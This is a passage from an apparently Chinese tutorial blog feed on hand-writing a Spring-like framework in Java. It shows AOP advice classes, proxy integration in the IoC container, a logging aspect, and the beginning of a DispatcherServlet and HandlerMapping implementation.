function_">setUserAttribute</span><span class="hljs-params">(String key, Object value)</span> &#123;        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> != value)&#123;            <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == <span class="hljs-built_in">this</span>.userAttributes)&#123;                <span class="hljs-built_in">this</span>.userAttributes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String,Object&gt;();            &#125;            <span class="hljs-built_in">this</span>.userAttributes.put(key, value);        &#125;<span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> != <span class="hljs-built_in">this</span>.userAttributes)&#123;                <span class="hljs-built_in">this</span>.userAttributes.remove(key);            &#125;        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getUserAttribute</span><span class="hljs-params">(String key)</span> &#123;        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">this</span>.userAttributes != <span class="hljs-literal">null</span> ? <span class="hljs-built_in">this</span>.userAttributes.get(key):<span class="hljs-literal">null</span>);    &#125;&#125;</code></pre></div></li></ul><h2 id="设计AOP基础实现"><a href="#设计AOP基础实现" class="headerlink" title="设计AOP基础实现"></a>设计AOP基础实现</h2><ul><li><p>Advice作为所有回调通知的顶层接口设计，暂时只是作为规范，没实现任何功能。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.aspect;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 回调通知顶层接口</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyAdvice</span> &#123;&#125;</code></pre></div></li><li><p>AbstractAspectJAdvice：使用模版设计MyAbstractAspectJAdvice类，封装拦截器回调的通用逻辑，主要封装反射动态调用方法，其子类只需要控制调用顺序即可。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.aspect;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 封装拦截器回调的通用逻辑，主要封装了反射动态调用方法</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAbstractAspectJAdvice</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyAdvice</span>&#123;    <span class="hljs-keyword">private</span> Method aspectMethod;    <span class="hljs-keyword">private</span> Object aspectTarget;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyAbstractAspectJAdvice</span><span class="hljs-params">(Method aspectMethod, Object aspectTarget)</span> &#123;        <span class="hljs-built_in">this</span>.aspectMethod = aspectMethod;        <span class="hljs-built_in">this</span>.aspectTarget = aspectTarget;    &#125;        <span class="hljs-comment">//反射动态调用方法</span>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">invokeAdviceMethod</span><span class="hljs-params">(MyJoinPoint joinPoint,Object returnValue,Throwable ex)</span><span class="hljs-keyword">throws</span> Throwable&#123;        Class&lt;?&gt;[] paramsTypes = <span class="hljs-built_in">this</span>.aspectMethod.getParameterTypes();        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == paramsTypes || paramsTypes.length == <span class="hljs-number">0</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.aspectMethod.invoke(aspectTarget);        &#125; <span class="hljs-keyword">else</span> &#123;            Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[paramsTypes.length];            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; paramsTypes.length; i++) &#123;                <span class="hljs-keyword">if</span>(paramsTypes[i] == MyJoinPoint.class)&#123;                    args[i] = joinPoint;                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(paramsTypes[i] == Throwable.class)&#123;                    args[i] = ex;                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(paramsTypes[i] == Object.class)&#123;                    args[i] = returnValue;                &#125;            &#125;            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.aspectMethod.invoke(aspectTarget,args);        &#125;    &#125;&#125;</code></pre></div></li><li><p>MethodBeforeAdvice：继承自AbstractAspectJAdivce，实现Advice和MethodInterceptor接口，在invoke()中控制前置通知的调用顺序</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.aspect;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.intercept.MyMethodInterceptor;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.intercept.MyMethodInvocation;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 前置通知具体实现</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMethodBeforeAdvice</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyAbstractAspectJAdvice</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyAdvice</span>, MyMethodInterceptor &#123;    <span class="hljs-keyword">private</span> MyJoinPoint joinPoint;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyMethodBeforeAdvice</span><span class="hljs-params">(Method aspectMethod, Object aspectTarget)</span> &#123;        <span class="hljs-built_in">super</span>(aspectMethod, aspectTarget);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">(Method method,Object[] args,Object target)</span><span class="hljs-keyword">throws</span> Throwable&#123;        invokeAdviceMethod(<span class="hljs-built_in">this</span>.joinPoint,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(MyMethodInvocation mi)</span> <span class="hljs-keyword">throws</span> Throwable &#123;        <span class="hljs-built_in">this</span>.joinPoint = mi;        <span class="hljs-built_in">this</span>.before(mi.getMethod(), mi.getArguments(), mi.getThis());        <span class="hljs-keyword">return</span> mi.proceed();    &#125;&#125;</code></pre></div></li><li><p>AfterReturningAdvice：继承自AbstractAspectJAdivce，实现Advice和MethodInterceptor接口，在invoke()中控制后置通知的调用顺序</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.aspect;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.intercept.MyMethodInterceptor;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.intercept.MyMethodInvocation;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAfterReturningAdvice</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyAbstractAspectJAdvice</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyAdvice</span>, MyMethodInterceptor&#123;        <span class="hljs-keyword">private</span> MyJoinPoint joinPoint;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyAfterReturningAdvice</span><span class="hljs-params">(Method aspectMethod, Object aspectTarget)</span> &#123;        <span class="hljs-built_in">super</span>(aspectMethod, aspectTarget);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(MyMethodInvocation mi)</span> <span class="hljs-keyword">throws</span> Throwable &#123;        <span class="hljs-type">Object</span> <span class="hljs-variable">retVal</span> <span class="hljs-operator">=</span> mi.proceed();        <span class="hljs-built_in">this</span>.joinPoint = mi;        <span class="hljs-built_in">this</span>.afterReturning(retVal,mi.getMethod(),mi.getArguments(),mi.getThis());        <span class="hljs-keyword">return</span> retVal;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterReturning</span><span class="hljs-params">(Object retVal, Method method, Object[] arguments, Object aThis)</span> <span class="hljs-keyword">throws</span> Throwable &#123;        invokeAdviceMethod(joinPoint,retVal,<span class="hljs-literal">null</span>);    &#125;&#125;</code></pre></div></li><li><p>AfterThrowingAdvice：继承自AbstractAspectJAdivce，实现Advice和MethodInterceptor接口，在invoke()中控制异常通知的调用顺序</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.aspect;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.intercept.MyMethodInterceptor;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.intercept.MyMethodInvocation;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 异常通知的具体实现</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAfterThrowingAdvice</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyAbstractAspectJAdvice</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyAdvice</span>, MyMethodInterceptor &#123;        <span class="hljs-keyword">private</span> String throwingName;    <span class="hljs-keyword">private</span> MyMethodInvocation mi;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyAfterThrowingAdvice</span><span class="hljs-params">(Method aspectMethod, Object aspectTarget)</span> &#123;        <span class="hljs-built_in">super</span>(aspectMethod, aspectTarget);    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setThrowingName</span><span class="hljs-params">(String aspectAfterThrowingName)</span> &#123;        <span class="hljs-built_in">this</span>.throwingName = aspectAfterThrowingName;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(MyMethodInvocation mi)</span> <span class="hljs-keyword">throws</span> Throwable &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">return</span> mi.proceed();        &#125;<span class="hljs-keyword">catch</span> (Throwable ex)&#123;            invokeAdviceMethod(mi,<span class="hljs-literal">null</span>,ex.getCause());            <span class="hljs-keyword">throw</span> ex;        &#125;    &#125;&#125;</code></pre></div></li></ul><h2 id="接入getBean方法"><a href="#接入getBean方法" class="headerlink" title="接入getBean方法"></a>接入getBean方法</h2><ul><li><p>如何集成到IoC容器中去？在MyApplicationContext中的instantiateBean()方法，在初始化时就可以确定是否返回原生Bean或者ProxyBean。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">instantiateBean</span><span class="hljs-params">(MyBeanDefinition beanDefinition)</span> &#123;    <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;    <span class="hljs-type">String</span> <span class="hljs-variable">beanClassName</span> <span class="hljs-operator">=</span> beanDefinition.getBeanClassName();      <span class="hljs-keyword">try</span> &#123;        <span class="hljs-comment">//因为根据Class才能确定一个类是否有实例</span>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.factoryBeanObjectCache.containsKey(beanClassName))&#123;            instance = <span class="hljs-built_in">this</span>.factoryBeanObjectCache.get(beanClassName);        &#125;<span class="hljs-keyword">else</span> &#123;            Class&lt;?&gt; clazz = Class.forName(beanClassName);            instance = clazz.newInstance();                        <span class="hljs-type">MyAdvisedSupport</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> instantionAopConfig(beanDefinition);            config.setTargetClass(clazz);            config.setTarget(instance);                        <span class="hljs-keyword">if</span>(config.pointCutMatch())&#123;                instance = createProxy(config).getProxy();            &#125;            <span class="hljs-built_in">this</span>.factoryBeanObjectCache.put(beanClassName,instance);            <span class="hljs-built_in">this</span>.factoryBeanObjectCache.put(beanDefinition.getFactoryBeanName(),instance);        &#125;        <span class="hljs-keyword">return</span> instance;    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;        e.printStackTrace();    &#125; <span class="hljs-keyword">catch</span> (InstantiationException e) &#123;        e.printStackTrace();    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;        e.printStackTrace();    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;&#125;  <span class="hljs-keyword">private</span> MyAdvisedSupport <span class="hljs-title function_">instantionAopConfig</span><span class="hljs-params">(MyBeanDefinition beanDefinition)</span> &#123;    <span class="hljs-type">MyAopConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyAopConfig</span>();    config.setPointCut(reader.getConfig().getProperty(<span class="hljs-string">&quot;pointCut&quot;</span>));    config.setAspectClass(reader.getConfig().getProperty(<span class="hljs-string">&quot;aspectClass&quot;</span>));    config.setAspectBefore(reader.getConfig().getProperty(<span class="hljs-string">&quot;aspectBefore&quot;</span>));    config.setAspectAfter(reader.getConfig().getProperty(<span class="hljs-string">&quot;aspectAfter&quot;</span>));    config.setAspectAfterThrow(reader.getConfig().getProperty(<span class="hljs-string">&quot;aspectAfterThrow&quot;</span>));    config.setAspectAfterThrowingName(reader.getConfig().getProperty(<span class="hljs-string">&quot;aspectAfterThrowingName&quot;</span>));        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyAdvisedSupport</span>(config);&#125;<span class="hljs-keyword">private</span> MyAopProxy <span class="hljs-title function_">createProxy</span><span class="hljs-params">(MyAdvisedSupport config)</span>&#123;    <span class="hljs-type">Class</span> <span class="hljs-variable">targetClass</span> <span class="hljs-operator">=</span> config.getTargetClass();    <span class="hljs-keyword">if</span>(targetClass.getInterfaces().length&gt;<span class="hljs-number">0</span>)&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyJdkDynamicAopProxy</span>(config);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyCglibAopProxy</span>(config);&#125;</code></pre></div></li></ul><h2 id="织入业务代码"><a href="#织入业务代码" class="headerlink" title="织入业务代码"></a>织入业务代码</h2><ul><li><p>创建LogAspect类，实现对业务方法的监控。主要是记录目标方法的调用日志，获取目标方法名、实参列表、每次调用所消耗的时间</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.aspect;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.aspect.MyJoinPoint;<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<span class="hljs-keyword">import</span> java.util.Arrays;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 定义一个织入的切面逻辑，也就是要针对目标代理对象增强的逻辑</span><span class="hljs-comment"> * 本类主要完成对方法调用的监控，监听目标方法每次执行所消耗的时间</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Slf4j</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogAspect</span> &#123;    <span class="hljs-comment">//在调用一个方法之前，执行before方法</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">(MyJoinPoint joinPoint)</span>&#123;        joinPoint.setUserAttribute(<span class="hljs-string">&quot;startTime_&quot;</span> + joinPoint.getMethod().getName(),System.currentTimeMillis());        <span class="hljs-comment">//这个方法中的逻辑，是由我们自己写的</span>        log.info(<span class="hljs-string">&quot;Invoker Before Method!!!&quot;</span> +                <span class="hljs-string">&quot;\nTargetObject:&quot;</span> +  joinPoint.getThis() +                <span class="hljs-string">&quot;\nArgs:&quot;</span> + Arrays.toString(joinPoint.getArguments()));    &#125;    <span class="hljs-comment">//在调用一个方法之后，执行after方法</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">(MyJoinPoint joinPoint)</span>&#123;        log.info(<span class="hljs-string">&quot;Invoker After Method!!!&quot;</span> +                <span class="hljs-string">&quot;\nTargetObject:&quot;</span> +  joinPoint.getThis() +                <span class="hljs-string">&quot;\nArgs:&quot;</span> + Arrays.toString(joinPoint.getArguments()));        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> (Long) joinPoint.getUserAttribute(<span class="hljs-string">&quot;startTime_&quot;</span> + joinPoint.getMethod().getName());        <span class="hljs-type">long</span> <span class="hljs-variable">endTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();        System.out.println(<span class="hljs-string">&quot;use time :&quot;</span> + (endTime - startTime));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterThrowing</span><span class="hljs-params">(MyJoinPoint joinPoint, Throwable ex)</span>&#123;        log.info(<span class="hljs-string">&quot;出现异常&quot;</span> +                <span class="hljs-string">&quot;\nTargetObject:&quot;</span> +  joinPoint.getThis() +                <span class="hljs-string">&quot;\nArgs:&quot;</span> + Arrays.toString(joinPoint.getArguments()) +                <span class="hljs-string">&quot;\nThrows:&quot;</span> + ex.getMessage());    &#125;&#125;</code></pre></div></li><li><p>修改下ModifyService，在里面故意抛出异常测试</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.service.impl;<span class="hljs-keyword">import</span> com.czh.spring.demo.service.ModifyService;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ModifyServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ModifyService</span> &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 增加</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">add</span><span class="hljs-params">(String name, String address)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;故意抛出异常，测试前面通知是否生效！！！&quot;</span>);<span class="hljs-comment">//        return &quot;modifyService add,name=&quot; + name + &quot;,address=&quot; + address;</span>    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 修改</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">edit</span><span class="hljs-params">(Integer id, String name)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;modifyService edit,id=&quot;</span> + id + <span class="hljs-string">&quot;,name=&quot;</span> + name;    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 删除</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">remove</span><span class="hljs-params">(Integer id)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;modifyService id=&quot;</span> + id;    &#125;&#125;</code></pre></div></li></ul><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul><li><p><a href="http://localhost:8080/luelueking_Spring_Source_war/web/add.json%E4%BB%A5%E5%8F%8A%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA">http://localhost:8080/luelueking_Spring_Source_war/web/add.json以及控制台输出</a></p><p><img src="https://img-blog.csdnimg.cn/a338882902644733b0f70c0f43f3cec7.png" alt="请添加图片描述"></p></li><li><p>控制台输出</p><p><img src="https://img-blog.csdnimg.cn/c330b50209f345b084da7265a01af7f5.png" alt="请添加图片描述"></p></li><li><p><a href="http://localhost:8080/luelueking_Spring_Source_war/web/query.json?name=luelueking">http://localhost:8080/luelueking_Spring_Source_war/web/query.json?name=luelueking</a></p><p><img src="https://img-blog.csdnimg.cn/41241b598af449cfa20ee9b905846791.png" alt="请添加图片描述"></p></li><li><p>控制台输出</p><p><img src="https://img-blog.csdnimg.cn/797a1a7ab93946ca88220134eb3bb57e.png" alt="请添加图片描述"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>手写spring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>暑假最后几天！肝爆（手写）一个Spring之Day4</title>
    <link href="/2022/08/16/spring_day04/"/>
    <url>/2022/08/16/spring_day04/</url>
    
    <content type="html"><![CDATA[<h1 id="Day04—Spring-MVC我来辣"><a href="#Day04—Spring-MVC我来辣" class="headerlink" title="Day04—Spring MVC我来辣"></a>Day04—Spring MVC我来辣</h1><p>[TOC]</p><h2 id="DispatcherServlet入口建设"><a href="#DispatcherServlet入口建设" class="headerlink" title="DispatcherServlet入口建设"></a>DispatcherServlet入口建设</h2><ul><li><p>定义下全局变量</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc.servlet;<span class="hljs-keyword">import</span> com.czh.spring.framework.context.MyApplicationContext;<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 只作为一个MVC的启动入口</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Slf4j</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LOCATION</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;contextConfigLocation&quot;</span>;        <span class="hljs-keyword">private</span> List&lt;MyHandlerMapping&gt; handlerMappings = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();        <span class="hljs-keyword">private</span> Map&lt;MyHandlerMapping,HandlerAdaptor&gt; handlerAdaptors = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();        <span class="hljs-keyword">private</span> List&lt;MyViewResolver&gt; viewResolvers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();        <span class="hljs-keyword">private</span> MyApplicationContext context;&#125;</code></pre></div></li><li><p>init方法完成IoC容器的初始化和MVC九大组件的初始化</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;      <span class="hljs-comment">//初始化IoC容器</span>      context = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyApplicationContext</span>(config.getInitParameter(LOCATION));      <span class="hljs-comment">//初始化九大组件</span>      initStrategies(context);  &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initStrategies</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;      <span class="hljs-comment">//有九种策略</span>      <span class="hljs-comment">//针对每个用户的请求，都会经过一些处理策略处理，最终才能有结果输出</span>      <span class="hljs-comment">//每种策略可以自定义干预，但是最终结果都一致</span>      <span class="hljs-comment">//============九=大=组=件==========</span>      initMultipartResolver(context);<span class="hljs-comment">//文件上传解析，如果请求类型是multipart,将通过MultipartResolver进行文件上传解析</span>      initLocaleResolver(context);<span class="hljs-comment">//本地化解析</span>      initThemeResolver(context);<span class="hljs-comment">//主题解析</span>        initHandlerMappings(context);<span class="hljs-comment">//通过HandlerMapping将请求映射到处理器</span>      initHandlerAdapters(context);<span class="hljs-comment">//通过HandlerAdapter进行多类型的参数动态匹配</span>        initHandlerExceptionResolvers(context);<span class="hljs-comment">//如果执行过程中遇到异常，将交给HandlerExceptionResolver来解析</span>      initRequestToViewNameTranslator(context);<span class="hljs-comment">//直接将请求解析到视图名</span>        initViewResolvers(context);<span class="hljs-comment">//通过viewResolver将逻辑视图解析到具体视图实现</span>        initFlashMapManager(context);<span class="hljs-comment">//Flash映射管理器</span>      <span class="hljs-comment">//=================================</span>  &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initHandlerMappings</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initHandlerAdapters</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initFlashMapManager</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initViewResolvers</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initRequestToViewNameTranslator</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initHandlerExceptionResolvers</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initThemeResolver</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initLocaleResolver</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initMultipartResolver</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;&#125;</code></pre></div></li></ul><h2 id="MyHandlerMapping"><a href="#MyHandlerMapping" class="headerlink" title="MyHandlerMapping"></a>MyHandlerMapping</h2><ul><li><p>HandlerMapping主要就是用来保存URL和Method的对应关系，策略模式</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc;<span class="hljs-keyword">import</span> lombok.Data;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.util.regex.Pattern;<span class="hljs-meta">@Data</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandlerMapping</span> &#123;    <span class="hljs-keyword">private</span> Object controller;<span class="hljs-comment">//保存方法对应的实例</span>    <span class="hljs-keyword">private</span> Method method;<span class="hljs-comment">//保存映射的方法</span>    <span class="hljs-keyword">private</span> Pattern pattern;    <span class="hljs-comment">//URL的正则匹配</span>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyHandlerMapping</span><span class="hljs-params">(Pattern pattern,Object controller, Method method)</span> &#123;        <span class="hljs-built_in">this</span>.controller = controller;        <span class="hljs-built_in">this</span>.method = method;        <span class="hljs-built_in">this</span>.pattern = pattern;    &#125;&#125;</code></pre></div></li><li><p>DispatcherServlet完善initHandlerMappings方法</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment">   * 将Controller中配置的RequestMapping和Method进行一一对应</span><span class="hljs-comment">   * <span class="hljs-doctag">@param</span> context</span><span class="hljs-comment">   */</span>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initHandlerMappings</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;      <span class="hljs-comment">//按照我们通常的理解应该是一个Map</span>      String[] beanNames = context.getBeanDefinitionNames();        <span class="hljs-keyword">try</span> &#123;          <span class="hljs-keyword">for</span> (String beanName : beanNames) &#123;              <span class="hljs-type">Object</span> <span class="hljs-variable">controller</span> <span class="hljs-operator">=</span> context.getBean(beanName);              Class&lt;?&gt; clazz = controller.getClass();              <span class="hljs-keyword">if</span>(!clazz.isAnnotationPresent(MyController.class))<span class="hljs-keyword">continue</span>;              <span class="hljs-type">String</span> <span class="hljs-variable">baseUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;                <span class="hljs-keyword">if</span>(clazz.isAnnotationPresent(MyRequestMapping.class))&#123;                  <span class="hljs-type">MyRequestMapping</span> <span class="hljs-variable">requestMapping</span> <span class="hljs-operator">=</span> clazz.getAnnotation(MyRequestMapping.class);                  baseUrl = requestMapping.value();              &#125;                <span class="hljs-comment">//扫描所有的public类型的方法</span>              Method[] methods = clazz.getMethods();              <span class="hljs-keyword">for</span> (Method method : methods) &#123;                  <span class="hljs-keyword">if</span>(!method.isAnnotationPresent(MyRequestMapping.class))<span class="hljs-keyword">continue</span>;                    <span class="hljs-type">MyRequestMapping</span> <span class="hljs-variable">requestMapping</span> <span class="hljs-operator">=</span> method.getAnnotation(MyRequestMapping.class);                  <span class="hljs-comment">//自己细品</span><span class="hljs-type">String</span> <span class="hljs-variable">regex</span> <span class="hljs-operator">=</span> (<span class="hljs-string">&quot;/&quot;</span> + baseUrl + <span class="hljs-string">&quot;/&quot;</span> + requestMapping.value().replaceAll(<span class="hljs-string">&quot;\\*&quot;</span>, <span class="hljs-string">&quot;.*&quot;</span>)).replaceAll(<span class="hljs-string">&quot;/+&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>);                  <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(regex);                  <span class="hljs-built_in">this</span>.handlerMappings.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyHandlerMapping</span>(pattern,controller,method));                  log.info(<span class="hljs-string">&quot;Mapping: &quot;</span>+regex+<span class="hljs-string">&quot;,&quot;</span>+method);              &#125;          